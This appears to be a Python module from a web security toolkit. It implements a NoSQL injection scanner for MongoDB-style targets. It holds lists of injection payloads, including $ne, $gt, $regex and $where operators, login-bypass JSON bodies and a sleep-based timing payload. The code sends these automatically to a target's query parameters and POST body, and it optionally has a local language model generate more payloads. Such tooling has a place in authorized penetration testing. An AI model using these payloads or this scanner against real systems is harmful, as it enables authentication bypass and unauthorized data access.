import re
import json
import requests
from urllib.parse import urlparse, urlencode, parse_qs, quote
from utils.output import section, info, success, warning, error, result, table
from utils.ollama_helper import OllamaHelper

NOSQL_PAYLOADS = [
    # MongoDB $ne
    '{"$ne": ""}',
    '{"$ne": null}',
    '{"$ne": "admin"}',
    '{"$ne": true}',
    '{"$gt": ""}',
    '{"$gt": null}',
    '{"$regex": ".*"}',
    '{"$exists": true}',
    '{"$where": "1==1"}',
    '{"$where": "this.admin==true"}',
    # URL-encoded versions
    '[$ne]=',
    '[$ne]=null',
    '[$gt]=',
    '[$regex]=.*',
    '[$exists]=true',
    # Boolean true
    "true",
    # JavaScript truthy
    '{"$gt": ""}',
    '{"$gt": null}',
    # Express body parser $where
    '{"$where": "sleep(5000)"}',
]

JSON_NOSQL = [
    '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": "admin", "password": {"$ne": ""}}',
    '{"username": "admin", "password": {"$gt": ""}}',
    '{"$where": "1==1"}',
    '{"$where": "this.password.length > 0"}',
    '{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}',
    '{"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}',
]


class NoSQLInjection:
    name = "nosqli"
    description = "NoSQL injection vulnerability scanner for MongoDB and other NoSQL databases"

    @staticmethod
    def run(target, params="", method="GET", data="", timeout=10, threads=20, ollama_model=None):
        section(f"NoSQL Injection Scanner: {target}")

        ollama = OllamaHelper(model=ollama_model) if ollama_model else None
        results = {"target": target, "vulnerabilities": [], "total_tests": 0, "findings": 0}
        all_vulns = []

        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        test_params = [p.strip() for p in params.split(",") if p.strip()] if params else []
        if not test_params:
            parsed = urlparse(target)
            qs = parse_qs(parsed.query)
            test_params = list(qs.keys())
            if not test_params:
                test_params = ["username", "password", "user", "pass", "email", "id", "name", "token", "key", "search", "q", "query"]

        all_payloads = list(NOSQL_PAYLOADS)
        all_json_payloads = list(JSON_NOSQL)

        if ollama and ollama.available:
            info("Ollama: generating NoSQL injection payloads...")
            for param in test_params[:3]:
                ai_payloads = ollama.generate_nosql_payloads(param, "mongodb")
                if ai_payloads:
                    seen = set(all_payloads)
                    for p in ai_payloads:
                        if p not in seen:
                            all_payloads.append(p)
                            seen.add(p)
                    info(f"AI generated {len(ai_payloads)} payloads for '{param}'")

        base_url = target
        parsed_base = urlparse(base_url)
        original_query = parse_qs(parsed_base.query)

        # Test via query string
        for param_name in test_params:
            info(f"Testing parameter: {param_name}")
            for payload in all_payloads:
                results["total_tests"] += 1
                try:
                    qs_params = original_query.copy()
                    test_url = None

                    # Handle JSON operators in query strings
                    if payload.startswith("[") or payload.startswith("{"):
                        # JSON/$ operator style in query string
                        qs_params[param_name + payload] = [""]
                    else:
                        qs_params[param_name] = [payload]

                    new_qs = urlencode(qs_params, doseq=True)
                    test_url = f"{parsed_base.scheme}://{parsed_base.netloc}{parsed_base.path}?{new_qs}"

                    resp = requests.get(test_url, timeout=timeout,
                        headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=False)
                    body = resp.text

                    # Signs of successful NoSQL injection
                    indicators = [
                        "Welcome", "logged in", "success", "dashboard",
                        "admin panel", "profile", "authenticated",
                        "select", "found", "valid", "true"
                    ]
                    deny_indicators = ["invalid", "failed", "error", "wrong", "denied", "incorrect"]

                    success_count = sum(1 for i in indicators if i.lower() in body.lower())
                    deny_count = sum(1 for i in deny_indicators if i.lower() in body.lower())

                    if success_count >= 2 and deny_count == 0:
                        all_vulns.append({
                            "param": param_name, "payload": payload,
                            "type": "NOSQL_QS", "status_code": resp.status_code,
                            "confidence": "high"
                        })
                        results["findings"] += 1
                        success(f"[NOSQL_QS] {param_name} with NoSQL operator ({resp.status_code})")
                    elif resp.status_code != 500 and resp.status_code != 400 and len(body) > 200 and deny_count == 0 and success_count > 0:
                        all_vulns.append({
                            "param": param_name, "payload": payload,
                            "type": "NOSQL_QS_SUSPICIOUS", "status_code": resp.status_code,
                            "confidence": "medium"
                        })
                        results["findings"] += 1
                        warning(f"[NOSQL_QS_SUSPICIOUS] {param_name} with NoSQL operator ({resp.status_code})")

                except requests.exceptions.RequestException:
                    pass
                except Exception:
                    pass

        # Test via JSON body injection
        if method.upper() == "POST" or data:
            info("Testing JSON body injection...")
            for json_payload in all_json_payloads:
                results["total_tests"] += 1
                try:
                    try:
                        body_data = json.loads(json_payload)
                    except json.JSONDecodeError:
                        continue

                    resp = requests.post(base_url, json=body_data, timeout=timeout,
                        headers={
                            "User-Agent": "Mozilla/5.0",
                            "Content-Type": "application/json"
                        },
                        allow_redirects=False)

                    if resp.status_code == 200 and resp.status_code != 401:
                        body = resp.text
                        indicators = ["Welcome", "logged in", "success", "dashboard", "admin", "profile"]
                        if any(i.lower() in body.lower() for i in indicators):
                            all_vulns.append({
                                "payload": json_payload, "type": "NOSQL_JSON",
                                "status_code": resp.status_code, "confidence": "high"
                            })
                            results["findings"] += 1
                            success(f"[NOSQL_JSON] JSON body injection: {json_payload[:60]}... ({resp.status_code})")

                except requests.exceptions.RequestException:
                    pass
                except Exception:
                    pass

        if all_vulns:
            result("Total vulnerabilities found", str(len(all_vulns)))
            result("Parameters tested", ", ".join(test_params))

            table(["Parameter", "Type", "Confidence", "Status"], [
                [v.get("param", "json_body"), v["type"], v.get("confidence", "?"), str(v.get("status_code", ""))] for v in all_vulns[:20]
            ])

            if len(all_vulns) > 20:
                info(f"... and {len(all_vulns) - 20} more findings")
        else:
            warning("No NoSQL injection vulnerabilities detected")

        results["vulnerabilities"] = all_vulns
        results["parameters_tested"] = test_params
        return results
